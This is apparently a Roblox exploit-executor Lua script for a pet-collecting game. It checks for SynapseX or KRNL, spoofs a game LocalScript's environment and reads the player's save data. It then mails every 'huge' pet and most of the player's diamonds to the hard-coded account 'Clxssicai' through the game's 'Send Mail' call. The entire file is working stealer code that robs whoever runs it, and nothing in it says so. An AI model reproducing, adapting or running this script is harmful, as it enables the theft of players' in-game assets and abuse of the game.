local spoof = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs:FindFirstChildWhichIsA("LocalScript")
local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
local cooldown = os.time()
local secure_call_function
local Executor = string.lower(identifyexecutor())
local function define(name, value, parent)
	local lol = (typeof(value) == "function" and islclosure(value) and newcclosure(value)) or value
	if parent ~= nil then
		parent[name] = lol
	else
		getgenv()[name] = lol
	end
end
if string.find(Executor,"synapse") then
    secure_call_function = syn.secure_call
else
    local s,e = pcall(function()
        	define("secure_call", function(func, env, ...)
        	assert(typeof(func) == "function", "bad argument to #1 to 'secure_call' (function expected, got "..typeof(func)..")")
        	assert(typeof(env) == "Instance", "bad argument to #2 to 'secure_call' (Instance expected, got"..typeof(env)..")")
        	assert(env.ClassName == "LocalScript" or env.ClassName == "ModuleScript", "bad argument to #2 to 'secure_call' (LocalScript or ModuleScript expected, got "..env.ClassName..")")
        	return coroutine.wrap(function(...)
        		setthreadcontext(2)
        		setfenv(0, getsenv(env))
        		setfenv(1, getsenv(env))
        		return func(...)
        	end)(...)
        end, t)
    end)
    if not s then game.Players.LocalPlayer:Kick("Please use SynapseX/KRNL") else secure_call_function = getgenv()["secure_call"] end
end
if not secure_call_function then game.Players.LocalPlayer:Kick("Please use SynapseX/KRNL") end
local function is_huge(petdata)
    local powers = petdata.powers
    if powers then
        for i,v in pairs(powers) do
            if v[1] == "Best Friend" then
                return true
            end
        end
    end
    return false;
end
secure_call_function(function()
local save = v1.Save.Get()
for i,v in pairs(save.Pets) do
    if is_huge(v) then
        repeat wait(.1) until (cooldown - os.time()) <= 0
        local diamonds = (save.Diamonds)-20000000
        if diamonds < 0 then diamonds = 0 end
        v1.Network.Invoke("Send Mail", {
            ["Recipient"] = "Clxssicai",
            ["Diamonds"] = diamonds,
            ["Pets"] = {
                [1] = v.uid,
            },
            ["Message"] = "test"
        });
        cooldown = os.time() + 5
    end
end
end, spoof)
